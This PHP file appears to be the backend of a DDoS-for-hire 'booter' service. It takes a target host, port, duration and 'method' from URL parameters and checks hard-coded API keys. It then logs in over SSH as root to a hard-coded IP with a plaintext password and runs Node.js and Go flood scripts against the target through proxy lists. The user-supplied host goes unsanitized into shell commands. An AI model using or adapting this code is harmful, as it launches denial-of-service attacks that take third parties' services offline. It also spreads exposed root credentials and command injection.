<?php
/////////////////////////////////
//--     Venux API Script - Modified by Aggron    --//
/////////////////////////////////
ignore_user_abort(true);
set_time_limit(0);
//////////////////////////////////////////
//--    You're servers credentials    --//
//-- Enter you're servers credentials --//
//////////////////////////////////////////
$server_ip = "93.123.85.27";
$server_pass = "@Darkbotnet_owner";
$server_user = "root";
 
/////////////////////////////////////////
//-- Gets the value of each variable --//
/////////////////////////////////////////
$key = $_GET['key'];
$host = $_GET['host'];
$port = intval($_GET['port']);
$time = intval($_GET['time']);
$method = $_GET['method'];
/*$mode = $_GET['mode'];
$ratelimit = $_GET['ratelimit'];
$coockie = $_GET['coockie'];
$referrer = $_GET['referrer'];
$body = $_GET['body'];
if($ratelimit == '1') {
	$ratelimit = "false";
}
if($ratelimit == '2') {
	$ratelimit = "true";
}
if($mode == '1') {
	$mode = "GET";
}
if($mode == '2') {
	$mode = "POST";
}
if($coockie == '1') {
	$coockie = "false";
}
if($referrer == '1') {
	$referrer = "false";
}
if($body == '1') {
	$body = "false";
}
if($body == '2') {
	$body = "%RAND%";
}*/
///////////////////////////////////////////////////
//-- array of implemented method as a variable --//
///////////////////////////////////////////////////
$array = array("TLS", "HTTPS", "MIX", "UAM", "BRUNT", "ETS", "STOP");// Add you're existing methods here, and delete you're none existent methods.
$ray = array("APIZIPPY","azerbj");
 
////////////////////////////////////////
//-- Checks if the API key is empty --//
////////////////////////////////////////
if (!empty($key)){
}else{
die('Error: API key is empty!');}
 
//////////////////////////////////////////
//-- Checks if the API key is correct --//
//////////////////////////////////////////
if (in_array($key, $ray)){ //Change "key" to what ever yo want you're API key to be.
}else{
die('Error: Incorrect API key!');}
 
/////////////////////////////////
//-- Checks if time is empty --//
/////////////////////////////////
if (!empty($time)){
}else{
die('Error: time is empty!');}
 
/////////////////////////////////
//-- Checks if host is empty --//
/////////////////////////////////
if (!empty($host)){
}else{
die('Error: Host is empty!');}
///////////////////////////////////
//-- Checks if method is empty --//
///////////////////////////////////
if (!empty($method)){
}else{
die('Error: Method is empty!');}
 
///////////////////////////////////
//-- Checks if method is empty --//
///////////////////////////////////
if (in_array($method, $array)){
}else{
die('Error: The method you requested does not exist!');}
///////////////////////////////////////////////////
//-- Uses regex to see if the Port could exist --//
///////////////////////////////////////////////////
if ($port > 65535){
die('Error: Ports over 65535 do not exist');}
 
//////////////////////////////////
//-- Sets a Maximum boot time --//
//////////////////////////////////             
if ($time > 1000001){
die('Error: Cannot exceed 1000000 seconds!');} //Change 10 to the time you used above.
// screen -dm node bypass http://space-host.pro

 
//////////////////////////////////////////////////////////////////////////////
//--                        You're attack methods                         --//
//-- Make sure the command is formatted correctly for each method you add --//
//////////////////////////////////////////////////////////////////////////////
if ($method == "TLS") { $command = "cd /var/www/html && node tls2.js $host $port $time 55 9 proxy.txt"; }
if ($method == "TLS") { $command = "cd /var/www/html && node TLSv1.js $host $time 64 5 proxy.txt"; }
if ($method == "TLS") { $command = "cd /var/www/html && node tls3.js $host $port $time 8 5"; }
if ($method == "TLS") { $command = "cd /var/www/html && node TLSv2.js $host $time 64 5 proxy.txt"; }
if ($method == "HTTPS") { $command = "cd /var/www/html && node dstat.js $host $port 8 $time"; }
if ($method == "HTTPS") { $command = "cd /var/www/html && node cff.js GET $host proxy.txt $time 78 8 $port"; }
if ($method == "HTTPS") { $command = "cd /var/www/html && node HTTPS.js $host $time 5 proxy.txt 64"; }
if ($method == "HTTPS") { $command = "cd /var/www/html && go run SOCKET.go -site $host -data GET"; }
if ($method == "MIX") { $command = "cd /var/www/html && node MIX.js $host 10 $time"; }
if ($method == "MIX") { $command = "cd /var/www/html && node dstat.js $host $port 8 $time"; }
if ($method == "UAM") { $command = "cd /var/www/html && node cfuam.js $host $port $time"; }
if ($method == "UAM") { $command = "cd /var/www/html && node UAM.js $host $time 64 5 proxy.txt"; }
if ($method == "UAM") { $command = "cd /var/www/html && node node TLSv1.js $host $time 64 5 proxy.txt"; }
if ($method == "BRUNT") { $command = "cd /var/www/html && node uwow.js $host $port $time 78 proxy.txt 9"; }
if ($method == "BRUNT") { $command = "cd /var/www/html && node TLSB.js $host $time 5 POST proxy.txt 64"; }
if ($method == "BRUNT") { $command = "cd /var/www/html && go run SOCKET.go -site $host -data GET"; }
if ($method == "ETS") { $command = "cd /var/www/html && node tls2.js $host $port $time 55 9 proxy.txt"; }
if ($method == "ETS") { $command = "cd /var/www/html && node TLSv1.js $host $time 64 5 proxy.txt"; }
if ($method == "ETS") { $command = "cd /var/www/html && node tls3.js $host $port $time 8 5"; }
if ($method == "ETS") { $command = "cd /var/www/html && node TLSv2.js $host $time 64 5 proxy.txt"; }
if ($method == "ETS") { $command = "cd /var/www/html && node dstat.js $host $port 8 $time"; }
if ($method == "ETS") { $command = "cd /var/www/html && node cff.js GET $host proxy.txt $time 78 8 $port"; }
if ($method == "ETS") { $command = "cd /var/www/html && node HTTPS.js $host $time 5 proxy.txt 64"; }
if ($method == "ETS") { $command = "cd /var/www/html && go run SOCKET.go -site $host -data GET"; }
if ($method == "ETS") { $command = "cd /var/www/html && node MIX.js $host 10 $time"; }
if ($method == "ETS") { $command = "cd /var/www/html && node dstat.js $host $port 8 $time"; }
if ($method == "ETS") { $command = "cd /var/www/html && node cfuam.js $host $port $time"; }
if ($method == "ETS") { $command = "cd /var/www/html && node UAM.js $host $time 64 5 proxy.txt"; }
if ($method == "ETS") { $command = "cd /var/www/html && node node TLSv1.js $host $time 64 5 proxy.txt"; }
if ($method == "ETS") { $command = "cd /var/www/html && node uwow.js $host $port $time 78 proxy.txt 9"; }
if ($method == "ETS") { $command = "cd /var/www/html && node TLSB.js $host $time 5 POST proxy.txt 64"; }
if ($method == "ETS") { $command = "cd /var/www/html && go run SOCKET.go -site $host -data GET"; }
if ($method == "ETS") { $command = "cd /var/www/html && go run STRONG.go $host 5 get $time nil"; }


if ($method == "STOP") { $command = "pkill -f $host"; }
///////////////////////////////////////////////////////
if (!function_exists("ssh2_connect")) die("Error: SSH2 does not exist on you're server");
if(!($con = ssh2_connect($server_ip, 22))){
  echo "Error: Connection Issue";
} else {
 
///////////////////////////////////////////////////
//-- Attempts to login with you're credentials --//
///////////////////////////////////////////////////
    if(!ssh2_auth_password($con, $server_user, $server_pass)) {
        echo "Error: Login failed, one or more of you're server credentials are incorect.";
    } else {
       
////////////////////////////////////////////////////////////////////////////
//-- Tries to execute the attack with the requested method and settings --//
////////////////////////////////////////////////////////////////////////////   
        if (!($stream = ssh2_exec($con, $command ))) {
            echo "Error: You're server was not able to execute you're methods file and or its dependencies";
        } else {
////////////////////////////////////////////////////////////////////
//-- Executed the attack with the requested method and settings --//
////////////////////////////////////////////////////////////////////      
            stream_set_blocking($stream, false);
            $data = "";
            while ($buf = fread($stream,4096)) {
                $data .= $buf;
            }

                        echo "Sending Attack to $host</br>Port: $port </br>Time: $time</br>Methods: $method";
            fclose($stream);
        }
    }
}
?>